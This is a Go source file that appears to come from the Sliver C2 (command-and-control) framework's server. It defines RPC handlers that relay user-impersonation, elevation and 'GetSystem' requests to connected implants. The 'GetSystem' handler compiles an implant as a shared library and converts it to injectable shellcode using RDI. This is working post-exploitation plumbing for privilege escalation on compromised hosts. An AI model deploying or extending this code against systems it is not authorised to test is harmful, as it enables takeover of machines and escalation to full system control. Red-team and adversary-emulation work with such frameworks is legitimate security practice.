package rpc

import (
	"fmt"
	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	"sliver/server/core"
	"sliver/server/generate"
	"time"

	"github.com/golang/protobuf/proto"
)

func rpcImpersonate(req []byte, timeout time.Duration, resp RPCResponse) {
	impersonateReq := &sliverpb.ImpersonateReq{}
	err := proto.Unmarshal(req, impersonateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(impersonateReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	data, _ := proto.Marshal(&sliverpb.ImpersonateReq{
		Process:  impersonateReq.Process,
		Username: impersonateReq.Username,
		Args:     impersonateReq.Args,
	})

	data, err = sliver.Request(sliverpb.MsgImpersonateReq, timeout, data)
	resp(data, err)
}

func rpcGetSystem(req []byte, timeout time.Duration, resp RPCResponse) {
	gsReq := &clientpb.GetSystemReq{}
	err := proto.Unmarshal(req, gsReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(gsReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	config := generate.SliverConfigFromProtobuf(gsReq.Config)
	config.Format = clientpb.SliverConfig_SHARED_LIB
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.GetSystemReq{
		Data:     shellcode,
		SliverID: gsReq.SliverID,
	})

	data, err = sliver.Request(sliverpb.MsgGetSystemReq, timeout, data)
	resp(data, err)

}

func rpcElevate(req []byte, timeout time.Duration, resp RPCResponse) {
	elevateReq := &sliverpb.ElevateReq{}
	err := proto.Unmarshal(req, elevateReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(elevateReq.SliverID)
	if sliver == nil {
		resp([]byte{}, fmt.Errorf("Could not find sliver"))
		return
	}
	data, _ := proto.Marshal(&sliverpb.ElevateReq{})

	data, err = sliver.Request(sliverpb.MsgElevateReq, timeout, data)
	resp(data, err)

}
